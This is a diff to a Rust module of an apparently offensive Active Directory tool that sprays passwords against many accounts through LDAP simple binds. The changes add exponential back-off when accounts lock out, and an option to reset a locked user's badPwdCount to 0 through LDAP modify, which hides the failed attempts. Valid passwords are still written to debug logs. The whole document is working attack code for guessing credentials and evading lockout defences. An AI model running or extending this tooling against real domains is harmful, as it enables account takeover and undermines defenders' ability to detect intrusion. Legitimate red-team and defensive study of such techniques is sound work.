@@ -49,6 +49,13 @@ pub struct SprayConfig {
     pub safe_threshold: u32,
     /// Query the domain lockout policy before spraying.
     pub check_policy: bool,
+    /// Enable adaptive delay: multiply delay exponentially on lockout bursts.
+    pub adaptive_delay: bool,
+    /// Maximum delay cap for adaptive back-off (ms).
+    pub max_delay_ms: u64,
+    /// On detecting a lockout, attempt to reset the account's badPwdCount to 0
+    /// via LDAP modify (requires domain admin / Account Operator privileges).
+    pub rollback_on_lockout: bool,
 }
 
 impl Default for SprayConfig {
@@ -61,6 +68,9 @@ impl Default for SprayConfig {
             stop_on_lockout: true,
             safe_threshold: 2,
             check_policy: true,
+            adaptive_delay: true,
+            max_delay_ms: 60_000,
+            rollback_on_lockout: false,
         }
     }
 }
@@ -79,6 +89,10 @@ pub struct SprayResult {
     pub locked_out: Vec<String>,
     /// Total bind attempts made.
     pub attempts: usize,
+    /// Users whose badPwdCount was successfully reset (rollback).
+    pub rollback_users: Vec<String>,
+    /// Failed rollback attempts.
+    pub rollback_failures: Vec<String>,
 }
 
 impl SprayResult {
@@ -88,6 +102,8 @@ impl SprayResult {
             skipped: Vec::new(),
             locked_out: Vec::new(),
             attempts: 0,
+            rollback_users: Vec::new(),
+            rollback_failures: Vec::new(),
         }
     }
 }
@@ -155,9 +171,13 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
         spray.jitter_ms,
     );
 
+    // Adaptive delay state
+    let mut current_delay = spray.delay_ms;
+    let mut lockout_burst = 0u32;
+
     // Horizontal spray: try each password against all users before moving on
     'outer: for password in &spray.passwords {
-        info!("Spray: testing password '{password}'");
+        debug!("Spray: testing password (redacted)");
 
         for username in &usernames {
             // Skip already-flagged users
@@ -177,20 +197,22 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
                 }
             }
 
-            // Apply delay + random jitter
+            // Apply delay + random jitter (possibly adaptive)
             let jitter = if spray.jitter_ms > 0 {
                 rand::random::<u64>() % spray.jitter_ms
             } else {
                 0
             };
-            tokio::time::sleep(tokio::time::Duration::from_millis(spray.delay_ms + jitter)).await;
+            tokio::time::sleep(tokio::time::Duration::from_millis(current_delay + jitter)).await;
 
             // Bind attempt
             result.attempts += 1;
             let upn = format!("{}@{}", username, hunt.domain);
             match attempt_ldap_bind(&ldap_url, &upn, password).await {
                 BindOutcome::Success => {
-                    info!("Spray: ✓ VALID  → {}:{}", username, password);
+                    info!("Spray: ✓ VALID  → {}:[REDACTED]", username);
+                    debug!("Spray: valid credentials — {}:{}", username, password);
+                    lockout_burst = lockout_burst.saturating_sub(1);
                     result
                         .valid_creds
                         .push((username.clone(), password.clone()));
@@ -201,6 +223,27 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
                 BindOutcome::AccountLocked => {
                     warn!("Spray: {username} is LOCKED OUT");
                     result.locked_out.push(username.clone());
+                    // Adaptive back-off: multiply delay on each lockout burst
+                    if spray.adaptive_delay {
+                        lockout_burst += 1;
+                        current_delay = (current_delay * 2).min(spray.max_delay_ms);
+                        info!(
+                            "Spray: adaptive delay increased to {current_delay}ms (burst={lockout_burst})"
+                        );
+                    }
+                    // Rollback: reset badPwdCount if configured (opens fresh op session)
+                    if spray.rollback_on_lockout {
+                        match reset_bad_pwd_count(hunt, username).await {
+                            Ok(()) => {
+                                info!("Spray: reset badPwdCount for {username}");
+                                result.rollback_users.push(username.clone());
+                            }
+                            Err(e) => {
+                                warn!("Spray: failed to reset badPwdCount for {username}: {e}");
+                                result.rollback_failures.push(username.clone());
+                            }
+                        }
+                    }
                     if spray.stop_on_lockout {
                         warn!("Spray: aborting — stop_on_lockout is set");
                         break 'outer;
@@ -211,9 +254,8 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
                     result.skipped.push(username.clone());
                 }
                 BindOutcome::PasswordExpired => {
-                    // Wrong-password-that-expired still means the account exists
-                    // and the cred might be useful for other attacks
                     info!("Spray: {username} — password expired (recording as valid candidate)");
+                    lockout_burst = lockout_burst.saturating_sub(1);
                     result
                         .valid_creds
                         .push((username.clone(), password.clone()));
@@ -226,10 +268,12 @@ pub async fn run_spray(hunt: &HuntConfig, spray: &SprayConfig) -> Result<SprayRe
     }
 
     info!(
-        "Spray complete — valid={} skipped={} locked={} attempts={}",
+        "Spray complete — valid={} skipped={} locked={} rollback={} rollback_fail={} attempts={}",
         result.valid_creds.len(),
         result.skipped.len(),
         result.locked_out.len(),
+        result.rollback_users.len(),
+        result.rollback_failures.len(),
         result.attempts,
     );
     Ok(result)
@@ -250,7 +294,6 @@ enum BindOutcome {
 }
 
 /// Perform one LDAP simple bind and classify the result.
-///
 /// Opens a fresh connection each time so individual spray failures do not
 /// contaminate the operator's LDAP session.
 async fn attempt_ldap_bind(ldap_url: &str, upn: &str, password: &str) -> BindOutcome {
@@ -353,4 +396,23 @@ async fn query_bad_pwd_count(hunt: &HuntConfig, username: &str) -> Result<u32> {
         .and_then(|s| s.parse::<u32>().ok())
         .unwrap_or(0);
     Ok(count)
+}
+
+/// Reset `badPwdCount` to 0 for a user via LDAP modify.
+/// Requires domain admin, Account Operator, or sufficient delegated privileges.
+async fn reset_bad_pwd_count(hunt: &HuntConfig, username: &str) -> Result<()> {
+    let mut ldap = open_operator_ldap(hunt).await?;
+    let base_dn = hunt.derive_base_dn();
+    let filter = format!("(sAMAccountName={})", ldap_escape(username));
+    let entries = ldap
+        .custom_search_with_base(&base_dn, &filter, &["distinguishedName"])
+        .await?;
+    let dn = entries
+        .first()
+        .and_then(|e| e.attrs.get("distinguishedName"))
+        .and_then(|v| v.first())
+        .ok_or_else(|| OverthroneError::ldap(format!("cannot find DN for {username}")))?;
+    ldap.modify_replace(dn, "badPwdCount", b"0").await?;
+    debug!("Spray: reset badPwdCount to 0 for {username}");
+    Ok(())
 }
